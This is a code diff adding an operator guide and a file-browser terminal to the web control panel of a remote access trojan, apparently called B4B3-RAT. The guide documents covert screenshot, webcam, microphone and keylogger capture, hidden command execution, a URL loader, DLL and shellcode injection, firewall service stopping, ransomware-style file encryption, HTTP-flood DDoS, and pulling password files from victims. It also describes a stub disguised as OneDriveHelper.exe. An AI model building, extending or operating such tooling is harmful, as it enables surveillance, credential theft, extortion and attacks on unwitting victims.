@@ -279,6 +279,36 @@ a{color:var(--accent);text-decoration:none}
   .atk-grid{grid-template-columns:1fr}
   .pnav{font-size:11px;padding:4px 6px}
 }
+/* ── File Manager Terminal ── */
+.fm-wrap{display:flex;flex-direction:column;background:var(--bg2);border:1px solid var(--bg3);border-radius:14px;overflow:hidden;flex:1;min-height:500px}
+.fm-titlebar{padding:12px 16px;border-bottom:1px solid var(--bg3);display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+.fm-output{flex:1;background:var(--bg);font-family:monospace;font-size:12px;color:var(--light);padding:12px 16px;overflow-y:auto;line-height:1.8;white-space:pre-wrap;word-break:break-all;min-height:0}
+.fm-inputrow{display:flex;align-items:stretch;border-top:1px solid var(--bg3);background:var(--bg2);flex-shrink:0}
+.fm-prompt{font-family:monospace;font-size:12px;color:var(--accent);padding:0 8px 0 12px;white-space:nowrap;display:flex;align-items:center}
+.fm-input{flex:1;background:transparent;border:none;color:var(--text);font-family:monospace;font-size:12px;padding:11px 4px;outline:none}
+.fm-dir{cursor:pointer;display:inline-block}
+.fm-dir:hover span{text-decoration:underline}
+.fm-file{display:inline-block}
+/* ── Docs page ── */
+.docs-wrap{max-width:860px;margin:0 auto;padding:24px 20px 48px;display:flex;flex-direction:column;gap:28px}
+.docs-section{display:flex;flex-direction:column;gap:12px}
+.docs-h1{font-size:22px;font-weight:800;color:var(--text);border-bottom:2px solid var(--accent);padding-bottom:8px}
+.docs-h2{font-size:14px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.docs-p{font-size:13px;color:var(--light);line-height:1.7}
+.docs-note{background:#0e2a1a;border:1px solid #1a5a2a;border-radius:8px;padding:10px 14px;font-size:12px;color:#7de0a0;font-family:monospace}
+.docs-warn{background:#2a0e0e;border:1px solid #5a1a1a;border-radius:8px;padding:10px 14px;font-size:12px;color:#f07070}
+.docs-table{width:100%;border-collapse:collapse;font-size:12px}
+.docs-table th{text-align:left;color:var(--muted);font-weight:600;padding:7px 10px;border-bottom:2px solid var(--bg3);background:var(--bg2)}
+.docs-table td{padding:8px 10px;border-bottom:1px solid var(--bg3);vertical-align:top;color:var(--light)}
+.docs-table tr:last-child td{border-bottom:none}
+.docs-table td:first-child{font-family:monospace;font-size:11px;color:var(--accent);white-space:nowrap}
+.docs-table tr:hover td{background:rgba(0,194,168,0.04)}
+.docs-card{background:var(--bg2);border:1px solid var(--bg3);border-radius:10px;overflow:hidden}
+.docs-sub{font-size:12px;color:var(--muted);margin-top:2px}
+.docs-tag{display:inline-block;font-size:10px;font-weight:700;padding:1px 7px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;margin-left:6px;vertical-align:middle}
+.docs-tag-danger{background:#3a0a0a;color:#e84242}
+.docs-tag-info{background:#0a1a3a;color:#4a90d9}
+.docs-tag-ok{background:#0a2a1a;color:#00C2A8}
 </style>
 </head>
 <body>
@@ -291,6 +321,7 @@ a{color:var(--accent);text-decoration:none}
     <button class="pnav" id="pnav-bot" onclick="showPage('bot')" style="display:none">Bot Detail</button>
     <button class="pnav" id="pnav-android" onclick="showPage('android')">Android</button>
     <button class="pnav" id="pnav-builder" onclick="showPage('builder')">&#9881; Builder</button>
+    <button class="pnav" id="pnav-docs" onclick="showPage('docs')">&#128214; Docs</button>
   </nav>
   <div class="spacer"></div>
   <label class="auto-row"><input type="checkbox" id="auto-refresh" checked> Auto-refresh</label>
@@ -317,6 +348,7 @@ a{color:var(--accent);text-decoration:none}
       <button class="tab" onclick="switchTab('report')">Report</button>
       <button class="tab" onclick="switchTab('lab')">Lab Console</button>
       <button class="tab" onclick="switchTab('coverage')">Coverage</button>
+      <button class="tab" onclick="switchTab('files')">&#128193; Files</button>
     </div>
     <div class="tab-content" id="main-content">
       <div class="empty">Loading...</div>
@@ -365,6 +397,7 @@ function showPage(p) {
   else if (p==='bot' && selId) renderTab(selId, currentTab);
   else if (p==='android') renderAndroidPage();
   else if (p==='builder') renderBuilder();
+  else if (p==='docs')    renderDocs();
 }
 
 function switchTab(tab) {
@@ -752,6 +785,7 @@ async function renderTab(id, tab) {
     case 'report':      renderReport(bot); break;
     case 'lab':         renderLab(bot); break;
     case 'coverage':    renderCoverage(bot); break;
+    case 'files':       renderFiles(bot); break;
   }
 }
 
@@ -1360,6 +1394,511 @@ function startRefresh() {
 document.getElementById('auto-refresh').addEventListener('change', function(){
   this.checked ? startRefresh() : clearInterval(refreshTimer);
 });
+
+// ── Page: Docs ────────────────────────────────────────────────────────────────
+
+function renderDocs() {
+  document.getElementById('tab-bar').style.display = 'none';
+  document.getElementById('main-content').innerHTML = `
+<div class="tab-content" style="overflow-y:auto;flex:1">
+<div class="docs-wrap">
+
+<!-- ═══════════════════════════════════════════════════════ OVERVIEW ══ -->
+<div class="docs-section">
+  <div class="docs-h1">B4B3-RAT Dashboard — Operator Guide</div>
+  <p class="docs-p">This guide covers every feature of the dashboard, every bot command, and how the 📁 Files tab works. Bookmark this tab — you can always open it from the top nav.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ DASHBOARD NAV ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Dashboard Navigation</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:130px">Page</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td>Overview</td><td>Live summary of all connected bots — total count, online vs stale, recent events across all bots. Auto-refreshes every 5 s.</td></tr>
+        <tr><td>Bot Detail</td><td>Appears when you click a bot in the sidebar. Contains all the per-bot tabs described below. The sidebar shows all bots sorted by most-recent check-in. Green dot = checked in within 60 s.</td></tr>
+        <tr><td>⚙ Builder</td><td>Configure and download a pre-patched <code>OneDriveHelper.exe</code> stub. Fill in C2 Host, Port, Auth Key, poll delay, and drop path, then click Build.</td></tr>
+        <tr><td>📖 Docs</td><td>This page.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════ BOT TABS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Bot Detail Tabs</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:130px">Tab</th><th>What it shows / lets you do</th></tr></thead>
+      <tbody>
+        <tr><td>Summary</td><td>System info (hostname, user, OS, IP), command input box, all command results, and a grid of every file the bot has uploaded (screenshots, recordings, pulled files). This is the main control tab.</td></tr>
+        <tr><td>Risk Score</td><td>Automated score (0–200+) built from telemetry rules. Breaks down which activities contributed points. CRITICAL ≥100, HIGH ≥65, MEDIUM ≥35, LOW below.</td></tr>
+        <tr><td>Timeline</td><td>Every event sorted by time. Filter by severity (critical / high / medium / low / info). Use this to replay exactly what happened and when.</td></tr>
+        <tr><td>Network</td><td>All network connections and HTTP traffic the bot has logged. Shows src→dst flows with ports and timestamps.</td></tr>
+        <tr><td>Persistence</td><td>Registry run keys, startup entries, and scheduled tasks detected on the target.</td></tr>
+        <tr><td>ATT&amp;CK</td><td>MITRE ATT&amp;CK technique matrix. Highlights which techniques have been observed on this bot.</td></tr>
+        <tr><td>Detections</td><td>Detection rules that have fired — name, severity, MITRE ID, and the event that triggered each rule.</td></tr>
+        <tr><td>Incidents</td><td>Groups of related detections bundled into incidents with confidence scores.</td></tr>
+        <tr><td>IOCs</td><td>Indicators of Compromise: hashes, IPs, domains, registry keys, file paths observed on the bot.</td></tr>
+        <tr><td>Report</td><td>Export a full plaintext or JSON report of all bot activity. Use for logging or external analysis.</td></tr>
+        <tr><td>Lab Console</td><td>Pre-built action playbooks (screenshot burst, keylog capture, process dump, etc.). Click an action to queue it; approve and execute from the same tab.</td></tr>
+        <tr><td>Coverage</td><td>Shows which command categories have been used vs which have never been run — useful for planning what to test next.</td></tr>
+        <tr><td>📁 Files</td><td>Terminal-style file browser. Navigate folders, read files, and pull (download) any file from the target. See the Files Tab section below for all commands.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════ SENDING COMMANDS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">How to Send a Command</div>
+  <p class="docs-p">Go to <b>Bot Detail → Summary tab</b>. Type the command in the input box at the top of the page and press <b>Enter</b> or click <b>Send</b>. Results appear in the Results box below within a few seconds (depends on the stub's poll interval — default 3 s). The bot polls the C2 for commands, executes, then sends the result back. You can send the next command before the result arrives.</p>
+  <div class="docs-note">Tip: The auto-refresh checkbox keeps the results box live. Leave it on.</div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════ COMMANDS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — System</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:220px">Command</th><th>Description &amp; Notes</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>screenshot</td>
+          <td>Takes a full-screen screenshot, uploads it to the C2. The image appears in <b>Summary → Uploaded Files</b> as a download link. Works silently — no window, no notification.</td>
+        </tr>
+        <tr>
+          <td>webcam capture</td>
+          <td>Captures a single frame from the default webcam, uploads as JPEG. Appears in Uploaded Files. Target must have a webcam; fails silently if none.</td>
+        </tr>
+        <tr>
+          <td>mic record &lt;seconds&gt;</td>
+          <td>Records the microphone for 1–60 seconds, uploads as a WAV file. Example: <code>mic record 10</code>. Appears in Uploaded Files.</td>
+        </tr>
+        <tr>
+          <td>system &lt;command&gt;</td>
+          <td>Run any Windows command via <code>cmd.exe</code> in a hidden window. Result is sent back as text. Examples:<br>
+            <code>system whoami</code><br>
+            <code>system ipconfig /all</code><br>
+            <code>system net user</code><br>
+            <code>system tasklist</code>
+          </td>
+        </tr>
+        <tr>
+          <td>run &lt;path&gt; [args]</td>
+          <td>Execute any file on the target machine. Example: <code>run C:\Windows\System32\calc.exe</code></td>
+        </tr>
+        <tr>
+          <td>loader &lt;URL&gt; &lt;dest&gt;</td>
+          <td>Download a file from any URL and save it to a path on the target. Example: <code>loader https://example.com/tool.exe C:\Users\Public\tool.exe</code></td>
+        </tr>
+        <tr>
+          <td>disable display</td>
+          <td>Turns the monitor off immediately (power-saving state). Moving the mouse or pressing a key turns it back on. Does not disrupt the stub.</td>
+        </tr>
+        <tr>
+          <td>disable pc <span class="docs-tag docs-tag-danger">DANGER</span></td>
+          <td>Runs <code>shutdown -s</code> — <b>fully shuts down the target machine</b>. The bot goes offline instantly and will not reconnect until someone physically powers the PC back on. Use only intentionally.</td>
+        </tr>
+        <tr>
+          <td>close</td>
+          <td>Terminates the stub process. The Protector watchdog will restart it after a few seconds unless it has also been killed. Bot will re-appear after the next stub restart.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — File Manager (from Summary tab)</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>dir show &lt;path&gt;</td>
+          <td>List all files and folders in a directory. Results come back prefixed: <code>[D]</code> = directory, <code>[F]</code> = file. Example: <code>dir show C:\Users\Public</code><br>Use the <b>📁 Files tab</b> for a clickable version of this command.</td>
+        </tr>
+        <tr>
+          <td>dir read &lt;path&gt;</td>
+          <td>Read the full contents of a text file and return it as the result. Best for small files (logs, configs, .txt, .ini). Example: <code>dir read C:\Users\Public\passwords.txt</code></td>
+        </tr>
+        <tr>
+          <td>dir write &lt;path&gt; &lt;text&gt;</td>
+          <td>Write text to a file (overwrites if it exists). Example: <code>dir write C:\Users\Public\note.txt hello world</code></td>
+        </tr>
+        <tr>
+          <td>dir del_file &lt;path&gt;</td>
+          <td>Delete a file. Example: <code>dir del_file C:\Users\Public\evidence.txt</code></td>
+        </tr>
+        <tr>
+          <td>pull &lt;path&gt; <span class="docs-tag docs-tag-ok">NEW</span></td>
+          <td>Upload any file from the target to the C2 server (up to 20 MB). Works with any file type — images, videos, documents, executables, databases. After the upload completes the <b>Summary → Uploaded Files</b> section shows a download link. Examples:<br>
+            <code>pull C:\Users\Public\Documents\report.docx</code><br>
+            <code>pull C:\Users\Munib\Desktop\passwords.xlsx</code><br>
+            <code>pull C:\Users\Munib\Pictures\photo.jpg</code>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ FILES TAB ══ -->
+<div class="docs-section">
+  <div class="docs-h2">📁 Files Tab — Terminal File Browser</div>
+  <p class="docs-p">The Files tab is a terminal-style interface built on top of <code>dir show</code> and <code>pull</code>. Type commands in the input bar at the bottom, press Enter or the ▶ button. Results appear inline. Folders are clickable — click any 📁 to navigate into it. Files have a <b>↓ Pull</b> button to download them.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:200px">Type this</th><th>What happens</th></tr></thead>
+      <tbody>
+        <tr><td>ls</td><td>List the current directory (starts at <code>C:\</code>).</td></tr>
+        <tr><td>ls C:\Users</td><td>List a specific absolute path.</td></tr>
+        <tr><td>cd Users</td><td>Navigate into a subfolder of the current directory. Path updates in the prompt.</td></tr>
+        <tr><td>cd C:\Windows\System32</td><td>Jump to any absolute path.</td></tr>
+        <tr><td>cd ..</td><td>Go up one folder level.</td></tr>
+        <tr><td>pull file.mp4</td><td>Pull a file from the current directory — uploads it to C2 and gives you a download link.</td></tr>
+        <tr><td>pull C:\Users\Public\doc.pdf</td><td>Pull a file by absolute path.</td></tr>
+        <tr><td>cat config.ini</td><td>Read a text file's contents inline in the terminal.</td></tr>
+        <tr><td>cat C:\path\file.txt</td><td>Read any file by absolute path.</td></tr>
+        <tr><td>dir show C:\path</td><td>Raw dir listing — same as <code>ls C:\path</code>.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-note">The Files tab remembers your navigation history for the session. Switch to another tab and come back — it stays where you left off.</div>
+  <div class="docs-warn">⚠ Pull limit: 20 MB per file. Larger files will fail silently on the stub side. For large files, use <code>system copy</code> to split them first.</div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Keylogger</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:160px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>keylog start</td><td>Start capturing every keystroke in the background. Low CPU, runs silently until stopped or stub exits.</td></tr>
+        <tr><td>keylog stop</td><td>Stop the keylogger. Buffer is preserved.</td></tr>
+        <tr><td>keylog dump</td><td>Send the full keystroke buffer as a result. Shows exactly what was typed (with window titles). Clear the buffer by stopping and starting again.</td></tr>
+        <tr><td>keylog status</td><td>Returns whether the keylogger is currently running.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Process Manager</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>processes</td><td>Get the full list of running processes (PID, name, path). Same as Task Manager.</td></tr>
+        <tr><td>closeproc &lt;name.exe&gt;</td><td>Kill a process by executable name. Example: <code>closeproc notepad.exe</code></td></tr>
+        <tr><td>inject_dll &lt;proc.exe&gt; &lt;dll_path&gt;</td><td>Inject a DLL into a running process. Example: <code>inject_dll explorer.exe C:\Users\Public\hook.dll</code></td></tr>
+        <tr><td>inject_shell &lt;proc.exe&gt; &lt;shellcode_hex&gt;</td><td>Inject shellcode (hex string) into a process.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Service Manager</div>
+  <p class="docs-p">Manage Windows services and drivers. Requires the stub to be running with sufficient privileges.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:340px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>service show</td><td>List all Windows services and drivers with name, display name, status, and start type.</td></tr>
+        <tr><td>service start &lt;name&gt;</td><td>Start a stopped service. Example: <code>service start wuauserv</code></td></tr>
+        <tr><td>service stop &lt;name&gt;</td><td>Stop a running service. Example: <code>service stop MpsSvc</code> (Windows Firewall)</td></tr>
+        <tr><td>service delete &lt;name&gt;</td><td>Delete a service entry entirely.</td></tr>
+        <tr><td>service add &lt;name&gt; &lt;display&gt; &lt;path&gt; &lt;type&gt; &lt;starttype&gt;</td>
+          <td>Create a new service. Type values: <code>win32-service</code>, <code>kernel-driver</code>, <code>adapter-service</code>, <code>interactive-process</code>. StartType values: <code>auto-start</code>, <code>boot-start</code>, <code>demand-start</code>, <code>disabled</code>, <code>system-start</code>.<br>
+          Example: <code>service add MySvc "My Service" C:\tool.exe win32-service auto-start</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — File Cryptor</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>filecrypt &lt;path&gt; &lt;key&gt;</td><td>Encrypt a file with AES-256 using the given key. Encrypted file gets <code>.b4db4b3</code> extension. Original file is overwritten. Example: <code>filecrypt C:\data\file.docx mypassword123</code></td></tr>
+        <tr><td>filedecrypt &lt;path.b4db4b3&gt; &lt;key&gt;</td><td>Decrypt a previously encrypted file using the same key. Example: <code>filedecrypt C:\data\file.docx.b4db4b3 mypassword123</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — BotNet (DDoS)</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:220px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>botnet start &lt;url&gt;</td><td>Start flooding the target URL with HTTP requests from this bot. Example: <code>botnet start https://target.example.com</code></td></tr>
+        <tr><td>botnet stop</td><td>Stop the HTTP flood.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ QUICK WORKFLOWS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Quick Workflows</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0">Get basic recon</div>
+  <div class="docs-note">system whoami
+system hostname
+system ipconfig /all
+system net user</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Browse and download a file</div>
+  <div class="docs-note">1. Click the 📁 Files tab
+2. Type: ls
+3. Click any 📁 folder to navigate
+4. Click ↓ Pull next to any file to download it</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Take a screenshot every 10 seconds (manual burst)</div>
+  <div class="docs-note">screenshot
+(wait 10s)
+screenshot
+(repeat — or use Lab Console → Screenshot Burst)</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Capture keystrokes for 5 minutes then retrieve</div>
+  <div class="docs-note">keylog start
+(wait)
+keylog dump
+keylog stop</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Pull a specific file</div>
+  <div class="docs-note">pull C:\\Users\\Username\\Desktop\\passwords.txt</div>
+</div>
+
+<!-- ══════════════════════════════════════════════════ SERVER NOTES ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Server &amp; Deployment Notes</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:200px">Topic</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td>VPS address</td><td>C2 runs at port 4444 (plain HTTP). Do NOT add cert.pem/key.pem — the stub uses HTTP only, not HTTPS.</td></tr>
+        <tr><td>Update server</td><td><code>git pull &amp;&amp; pm2 restart c2-server</code> on the VPS. If package.json changed, run <code>npm install</code> first.</td></tr>
+        <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub &amp;&amp; powershell -ExecutionPolicy Bypass -File build.ps1</code> — then open Builder and re-configure to get a new OneDriveHelper.exe.</td></tr>
+        <tr><td>Duplicate bots</td><td>Fixed — bot ID is stored in registry. If you still see duplicates, the old binary (before the fix) is still running. Kill it with Task Manager → End Process Tree.</td></tr>
+        <tr><td>Uploaded files</td><td>Stored in <code>c2-server/uploads/</code> on the VPS. Download via Summary → Uploaded Files links (admin-authenticated).</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</div><!-- /docs-wrap -->
+</div><!-- /tab-content -->
+`;
+}
+
+// ── Tab: Files (Terminal File Manager) ───────────────────────────────────────
+
+const _fmState = {};
+
+function fmGet(botId) {
+  if (!_fmState[botId]) _fmState[botId] = { path: 'C:\\', history: [], waiting: false };
+  return _fmState[botId];
+}
+
+function renderFiles(bot) {
+  const st = fmGet(bot.id);
+  const mc = document.getElementById('main-content');
+  mc.innerHTML = `
+    <div class="fm-wrap">
+      <div class="fm-titlebar">
+        <span class="card-title" style="margin:0">File Manager — Bot #${esc(bot.id)}</span>
+        <span style="font-family:monospace;font-size:11px;color:var(--muted)">ls &nbsp;cd &nbsp;pull &nbsp;cat &nbsp;dir show</span>
+      </div>
+      <div class="fm-output" id="fm-output"></div>
+      <div class="fm-inputrow">
+        <span class="fm-prompt" id="fm-prompt">${esc(st.path)}&gt;</span>
+        <input class="fm-input" id="fm-input" type="text"
+          placeholder="ls  /  cd Users  /  pull file.txt  /  cat readme.txt"
+          onkeydown="if(event.key==='Enter')fmRun('${esc(bot.id)}')">
+        <button class="btn btn-send" style="border-radius:0;padding:0 18px;font-size:12px"
+          onclick="fmRun('${esc(bot.id)}')">&#9654;</button>
+      </div>
+    </div>`;
+  const out = document.getElementById('fm-output');
+  if (st.history.length) {
+    out.innerHTML = st.history.map(h=>h.html).join('\n') + '\n';
+  } else {
+    out.innerHTML = '<span style="color:var(--muted)">Type <b>ls</b> to list the current directory, or <b>cd C:\\Users</b> to navigate, or <b>pull C:\\path\\file.txt</b> to download a file.</span>\n';
+  }
+  out.scrollTop = out.scrollHeight;
+  document.getElementById('fm-input').focus();
+}
+
+function fmAppend(botId, html) {
+  const out = document.getElementById('fm-output');
+  if (!out) return;
+  out.innerHTML += html + '\n';
+  out.scrollTop = out.scrollHeight;
+}
+
+function fmRecord(botId, html) {
+  fmGet(botId).history.push({ html });
+}
+
+async function fmRun(botId) {
+  const inp = document.getElementById('fm-input');
+  if (!inp) return;
+  const raw = inp.value.trim();
+  if (!raw) return;
+  inp.value = '';
+  await fmExec(botId, raw);
+}
+
+async function fmExec(botId, raw) {
+  const st = fmGet(botId);
+  if (st.waiting) { fmAppend(botId, '<span style="color:var(--warn)">Busy — waiting for previous command...</span>'); return; }
+
+  let cmd, display;
+
+  if (raw === 'ls' || raw === 'dir') {
+    cmd = 'dir show ' + st.path;  display = 'ls';
+  } else if (raw.startsWith('ls ')) {
+    const p = fmAbs(st.path, raw.slice(3).trim());
+    st.path = p;  cmd = 'dir show ' + p;  display = raw;
+  } else if (raw.startsWith('cd ')) {
+    const arg = raw.slice(3).trim();
+    if (arg === '..') st.path = fmParent(st.path);
+    else st.path = fmAbs(st.path, arg);
+    cmd = 'dir show ' + st.path;  display = raw;
+  } else if (raw.match(/^dir\s+show\s+/i)) {
+    cmd = raw;  display = raw;
+    st.path = raw.replace(/^dir\s+show\s+/i, '').trim();
+  } else if (raw.startsWith('pull ')) {
+    cmd = 'pull ' + fmAbs(st.path, raw.slice(5).trim());  display = raw;
+  } else if (raw.startsWith('cat ') || raw.startsWith('read ')) {
+    const words = raw.split(/\s+/); words.shift();
+    cmd = 'dir read ' + fmAbs(st.path, words.join(' '));  display = raw;
+  } else {
+    cmd = raw;  display = raw;
+  }
+
+  // Update prompt span
+  const promptEl = document.getElementById('fm-prompt');
+  if (promptEl) promptEl.textContent = st.path + '>';
+
+  const promptLine = `<span style="color:var(--accent)">${esc(st.path)}&gt;</span> <span style="color:var(--warn)">${esc(display)}</span>`;
+  fmAppend(botId, promptLine);
+  fmRecord(botId, promptLine);
+
+  st.waiting = true;
+  let bot;
+  try { bot = await api('/api/bot/' + botId); }
+  catch(_) { fmAppend(botId,'<span style="color:#e84242">Error: cannot reach server</span>'); st.waiting=false; return; }
+
+  const prevRes   = bot.results.length;
+  const prevFiles = bot.files.length;
+
+  try { await api('/api/bot/'+botId+'/cmd',{method:'POST',body:JSON.stringify({cmd})}); }
+  catch(e) { fmAppend(botId,`<span style="color:#e84242">Send failed: ${esc(e.message)}</span>`); st.waiting=false; return; }
+
+  // Poll up to 30s for a result
+  let done = false;
+  for (let i=0; i<30 && !done; i++) {
+    await new Promise(r=>setTimeout(r,1000));
+    let fresh;
+    try { fresh = await api('/api/bot/'+botId); } catch(_) { break; }
+    if (fresh.results.length > prevRes) {
+      const data = fresh.results[fresh.results.length-1].data;
+      fmShowResult(botId, cmd, data, fresh, prevFiles);
+      done = true;
+    } else if (fresh.files.length > prevFiles) {
+      const fname = fresh.files[fresh.files.length-1];
+      const html = fmDownloadHtml(fname);
+      fmAppend(botId, html);  fmRecord(botId, html);
+      done = true;
+    }
+  }
+  if (!done) {
+    const t = '<span style="color:var(--muted)">⏱ Timed out — bot did not respond</span>';
+    fmAppend(botId, t);  fmRecord(botId, t);
+  }
+  st.waiting = false;
+}
+
+function fmShowResult(botId, cmd, data, bot, prevFiles) {
+  const entries = data.replace(/%0A/g,'\n').split('\n').map(s=>s.trim()).filter(Boolean);
+  const isListing = entries.length > 0 && (entries[0].startsWith('[D]') || entries[0].startsWith('[F]'));
+  let html = '';
+
+  if (isListing) {
+    const basePath = fmGet(botId).path;
+    const rows = entries.map(e => {
+      if (e.startsWith('[D]')) {
+        const name = e.slice(3);
+        const full = fmJoin(basePath, name);
+        return `<span class="fm-dir" data-bot="${esc(botId)}" data-path="${esc(full)}" onclick="fmNavigate(this.dataset.bot,this.dataset.path)">📁 <span style="color:var(--accent)">${esc(name)}</span></span>`;
+      } else {
+        const name = e.slice(3);
+        const full = fmJoin(basePath, name);
+        return `<span class="fm-file">📄 <span style="color:var(--light)">${esc(name)}</span>  <button class="btn btn-sec" style="font-size:10px;padding:1px 8px;margin-left:6px" data-bot="${esc(botId)}" data-path="${esc(full)}" onclick="fmPullBtn(this)">&darr; Pull</button></span>`;
+      }
+    });
+    html = rows.join('\n') || '<span style="color:var(--muted)">(empty)</span>';
+  } else if (/^uploaded:\s*/i.test(data)) {
+    const fname = data.replace(/^uploaded:\s*/i,'').trim();
+    html = fmDownloadHtml(fname);
+  } else if (data.startsWith('Error!')) {
+    html = `<span style="color:#e84242">${esc(data)}</span>`;
+  } else if (data.startsWith('Success!')) {
+    html = `<span style="color:#00C2A8">${esc(data)}</span>`;
+  } else {
+    // plain text (dir read, system output, etc.)
+    html = `<div style="background:var(--bg3);border-radius:6px;padding:8px 12px;margin:2px 0;max-height:200px;overflow-y:auto">${esc(data).replace(/%0A/g,'\n')}</div>`;
+  }
+
+  fmAppend(botId, html);
+  fmRecord(botId, html);
+}
+
+function fmDownloadHtml(fname) {
+  return `<span style="color:#00C2A8">✓ File received</span> — <a href="${API_BASE}/api/uploads/${encodeURIComponent(fname)}" target="_blank" style="color:var(--accent);font-weight:600">↓ Download ${esc(fname)}</a>`;
+}
+
+function fmNavigate(botId, path) {
+  fmGet(botId).path = path;
+  const p = document.getElementById('fm-prompt');
+  if (p) p.textContent = path + '>';
+  fmExec(botId, 'dir show ' + path);
+}
+
+function fmPullBtn(btn) {
+  fmExec(btn.dataset.bot, 'pull ' + btn.dataset.path);
+}
+
+function fmJoin(base, name) {
+  if (!name) return base;
+  if (/^[A-Za-z]:\\/.test(name)) return name;
+  const sep = base.endsWith('\\') ? '' : '\\';
+  return base + sep + name;
+}
+
+function fmParent(path) {
+  const p = path.replace(/\\+$/, '');
+  const idx = p.lastIndexOf('\\');
+  if (idx <= 2) return p.slice(0, idx+1) || path;
+  return p.slice(0, idx);
+}
+
+function fmAbs(base, input) {
+  if (!input) return base;
+  if (/^[A-Za-z]:\\/.test(input)) return input;
+  if (input === '..') return fmParent(base);
+  return fmJoin(base, input);
+}
 
 // ── Init: check auth, then load ───────────────────────────────────────────────
 
